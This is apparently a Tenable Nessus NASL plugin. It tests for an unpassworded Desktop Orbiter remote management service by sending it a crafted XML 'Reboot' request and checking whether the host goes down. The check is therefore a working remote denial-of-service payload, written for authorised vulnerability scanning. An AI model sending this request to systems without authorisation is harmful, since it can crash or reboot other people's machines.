#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(11713);
 script_version("$Revision: 1.14 $");
 script_cvs_date("$Date: 2014/05/25 23:45:39 $");

 script_name(english:"Desktop Orbiter Unpassworded Access Remote Reboot DoS");
 script_summary(english:"Reboots the remote host using Desktop Orbiter");

 script_set_attribute(attribute:"synopsis", value:"A remote management service is running on this host.");
 script_set_attribute(attribute:"description", value:
"The remote host is running a Desktop Orbiter Satellite

As this service is unpassworded, an attacker may connect to it to
reboot the remote host or take administrative control over it.");
 script_set_attribute(attribute:"solution", value:"Disable this service.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_set_attribute(attribute:"plugin_publication_date", value:"2003/06/10");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 2003-2014 Tenable Network Security, Inc.");
 script_family(english:"Backdoors");

 script_dependencie( "find_service1.nasl", "desktop_orbiter_detect.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/desktop-orbiter", 51051);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/desktop-orbiter");
if(!port)port = 51051;
if(!get_port_state(port))exit(0);

req = '<?xml version = "1.0"?>\r
\r
<Request version = "1.0" timestamp = "6/3/2003 10:52:11 AM">\r
   <param id = "_ActionId" value = "SIMPLEACTION" type = "string"/>\r
   <param id = "command" value = "Reboot" type = "string"/>\r
</Request>';


start_denial();
soc = open_sock_tcp(port);
if(!soc)exit(0);

send(socket:soc, data:raw_string(strlen(req) % 256, strlen(req) / 256, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00));
r = recv(socket:soc, length:8);
if(strlen(r) != 8 )exit(0);
len = ord(r[0]);
r = recv(socket:soc, length:len);
if("Reply version" >< r) {
 	sleep(20);
	alive = end_denial();
	if( ! alive ) security_hole(port);
	}
